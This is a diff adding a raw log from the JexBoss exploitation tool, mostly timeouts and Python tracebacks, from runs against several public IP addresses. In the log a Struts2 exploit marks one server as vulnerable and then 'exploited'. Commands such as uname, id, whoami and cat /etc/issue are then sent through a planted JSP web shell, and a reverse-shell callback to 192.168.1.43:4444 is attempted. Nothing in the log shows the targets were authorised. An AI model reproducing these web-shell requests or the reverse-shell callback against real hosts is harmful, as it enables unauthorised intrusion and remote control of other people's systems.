@@ -1,0 +1,462 @@
+2018-03-09 00:28:08,979 (INFO): Checking Host: http://121.40.150.225:8080/
+2018-03-09 00:30:09,825 (INFO): Checking Host: 200.192.112.51
+2018-03-09 00:30:16,387 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='200.192.112.51', port=80): Read timed out. (read timeout=6.0)",)': /
+2018-03-09 00:30:22,676 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='200.192.112.51', port=80): Read timed out. (read timeout=6.0)",)': /
+2018-03-09 00:30:28,953 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='200.192.112.51', port=80): Read timed out. (read timeout=6.0)",)': /
+2018-03-09 00:30:35,223 (INFO): An error occurred while connecting to the host 200.192.112.51
+Traceback (most recent call last):
+  File "jexboss.py", line 352, in check_vul
+    result = _exploits.exploit_struts2_jakarta_multipart(url, 'jexboss', gl_args.cookies)
+  File "/root/Desktop/jexboss/_exploits.py", line 103, in exploit_struts2_jakarta_multipart
+    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='200.192.112.51', port=80): Max retries exceeded with url: / (Caused by ReadTimeoutError("HTTPConnectionPool(host='200.192.112.51', port=80): Read timed out. (read timeout=6.0)",))
+2018-03-09 00:30:36,134 (INFO): An error occurred while connecting to the host 200.192.112.51
+Traceback (most recent call last):
+  File "jexboss.py", line 314, in check_vul
+    r = gl_http_pool.request('GET', url + "/" + link, redirect=True, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 311, in urlopen
+    conn = self.connection_from_host(u.host, port=u.port, scheme=u.scheme)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 227, in connection_from_host
+    return self.connection_from_context(request_context)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 237, in connection_from_context
+    pool_key_constructor = self.key_fn_by_scheme[scheme]
+KeyError: "200.192.112.51/'http"
+2018-03-09 00:31:36,233 (INFO): Checking Host: http://110.249.178.154:9000/
+2018-03-09 00:31:42,837 (INFO): Server http://110.249.178.154:9000/: VULNERABLE
+2018-03-09 00:32:20,346 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=uname+-a
+2018-03-09 00:32:27,885 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=uname+-a
+2018-03-09 00:32:35,441 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=uname+-a
+2018-03-09 00:32:42,996 (WARNING): Disabling checking for updates.
+Traceback (most recent call last):
+  File "jexboss.py", line 751, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='110.249.178.154', port=9000): Max retries exceeded with url: //jexws4/jexws4.jsp?ppp=uname+-a (Caused by ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",))
+2018-03-09 00:32:49,536 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=cat+%2Fetc%2Fissue
+2018-03-09 00:32:57,073 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=cat+%2Fetc%2Fissue
+2018-03-09 00:33:00,078 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f99644ea350>, 'Connection to 110.249.178.154 timed out. (connect timeout=3)')': //jexws4/jexws4.jsp?ppp=cat+%2Fetc%2Fissue
+2018-03-09 00:33:06,613 (WARNING): Disabling checking for updates.
+Traceback (most recent call last):
+  File "jexboss.py", line 751, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='110.249.178.154', port=9000): Max retries exceeded with url: //jexws4/jexws4.jsp?ppp=cat+%2Fetc%2Fissue (Caused by ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",))
+2018-03-09 00:33:13,145 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=id
+2018-03-09 00:33:19,691 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=id
+2018-03-09 00:33:22,696 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f99644ea190>, 'Connection to 110.249.178.154 timed out. (connect timeout=3)')': //jexws4/jexws4.jsp?ppp=id
+2018-03-09 00:33:30,261 (WARNING): Disabling checking for updates.
+Traceback (most recent call last):
+  File "jexboss.py", line 751, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='110.249.178.154', port=9000): Max retries exceeded with url: //jexws4/jexws4.jsp?ppp=id (Caused by ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",))
+2018-03-09 00:33:30,262 (INFO): Server http://110.249.178.154:9000/ exploited!
+2018-03-09 00:33:36,792 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=
+2018-03-09 00:33:43,329 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=
+2018-03-09 00:33:50,905 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=
+2018-03-09 00:33:58,422 (ERROR): Error contacting the command shell
+Traceback (most recent call last):
+  File "jexboss.py", line 775, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='110.249.178.154', port=9000): Max retries exceeded with url: //jexws4/jexws4.jsp?ppp= (Caused by ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",))
+2018-03-09 00:34:38,357 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=jexremote%3D192.168.1.43%3A4444
+2018-03-09 00:34:44,895 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=jexremote%3D192.168.1.43%3A4444
+2018-03-09 00:34:51,439 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=jexremote%3D192.168.1.43%3A4444
+2018-03-09 00:34:59,001 (ERROR): Error contacting the command shell
+Traceback (most recent call last):
+  File "jexboss.py", line 775, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='110.249.178.154', port=9000): Max retries exceeded with url: //jexws4/jexws4.jsp?ppp=jexremote%3D192.168.1.43%3A4444 (Caused by ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",))
+2018-03-09 00:35:21,874 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=cd
+2018-03-09 00:35:24,878 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x7f99644ea2d0>, 'Connection to 110.249.178.154 timed out. (connect timeout=3)')': //jexws4/jexws4.jsp?ppp=cd
+2018-03-09 00:35:32,434 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=cd
+2018-03-09 00:35:38,967 (ERROR): Error contacting the command shell
+Traceback (most recent call last):
+  File "jexboss.py", line 775, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='110.249.178.154', port=9000): Max retries exceeded with url: //jexws4/jexws4.jsp?ppp=cd (Caused by ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",))
+2018-03-09 00:35:58,480 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=whoami
+2018-03-09 00:36:05,017 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=whoami
+2018-03-09 00:36:12,563 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=whoami
+2018-03-09 00:36:19,104 (ERROR): Error contacting the command shell
+Traceback (most recent call last):
+  File "jexboss.py", line 775, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='110.249.178.154', port=9000): Max retries exceeded with url: //jexws4/jexws4.jsp?ppp=whoami (Caused by ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",))
+2018-03-09 00:36:37,558 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=ls
+2018-03-09 00:36:44,094 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=ls
+2018-03-09 00:36:50,634 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=ls
+2018-03-09 00:36:58,235 (ERROR): Error contacting the command shell
+Traceback (most recent call last):
+  File "jexboss.py", line 775, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='110.249.178.154', port=9000): Max retries exceeded with url: //jexws4/jexws4.jsp?ppp=ls (Caused by ReadTimeoutError("HTTPConnectionPool(host='110.249.178.154', port=9000): Read timed out. (read timeout=6.0)",))
+2018-03-09 00:37:34,512 (INFO): Checking Host: 192.168.1.43
+2018-03-09 00:37:34,513 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a20553d90>: Failed to establish a new connection: [Errno 111] Connection refused',)': /admin-console/
+2018-03-09 00:37:34,514 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a20553b90>: Failed to establish a new connection: [Errno 111] Connection refused',)': /admin-console/
+2018-03-09 00:37:34,514 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a20553750>: Failed to establish a new connection: [Errno 111] Connection refused',)': /admin-console/
+2018-03-09 00:37:34,515 (INFO): An error occurred while connecting to the host 192.168.1.43
+Traceback (most recent call last):
+  File "jexboss.py", line 424, in check_vul
+    r = gl_http_pool.request('HEAD', url + str(paths[vector]), redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='192.168.1.43', port=80): Max retries exceeded with url: /admin-console/ (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a20562d90>: Failed to establish a new connection: [Errno 111] Connection refused',))
+2018-03-09 00:37:34,517 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a205539d0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,517 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc8f190>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,518 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc8f2d0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,519 (INFO): An error occurred while connecting to the host 192.168.1.43
+Traceback (most recent call last):
+  File "jexboss.py", line 352, in check_vul
+    result = _exploits.exploit_struts2_jakarta_multipart(url, 'jexboss', gl_args.cookies)
+  File "/root/Desktop/jexboss/_exploits.py", line 103, in exploit_struts2_jakarta_multipart
+    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='192.168.1.43', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc8f410>: Failed to establish a new connection: [Errno 111] Connection refused',))
+2018-03-09 00:37:34,520 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a20562c50>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,520 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fcacd90>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,521 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fcaced0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,522 (INFO): An error occurred while connecting to the host 192.168.1.43
+Traceback (most recent call last):
+  File "jexboss.py", line 339, in check_vul
+    r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='192.168.1.43', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fcacfd0>: Failed to establish a new connection: [Errno 111] Connection refused',))
+2018-03-09 00:37:34,522 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a20553dd0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,530 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc8f2d0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,531 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc8f3d0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
